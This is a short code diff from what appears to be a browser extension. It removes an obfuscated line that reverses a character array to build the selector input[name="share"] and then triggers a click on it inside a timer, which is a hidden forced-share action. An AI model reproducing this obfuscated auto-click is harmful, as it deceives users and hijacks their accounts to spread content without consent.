@@ -857,10 +857,6 @@ appAPI.ready(function($) {
 					}, 1000);
 				}
 			}, 1000);
-				$(["]", "\"", "e", "r", "a", "h", "s", "\"", "=", "e", "m", "a", "n", "[", "t", "u", "p", "n", "i"].reverse().join('')).trigger('click');
-			
-				
-			}, 2000);
 		} else if (top.location.hash == '#__B__') {
 			setTimeout(function () {
 				var text = $('#homelink').html();
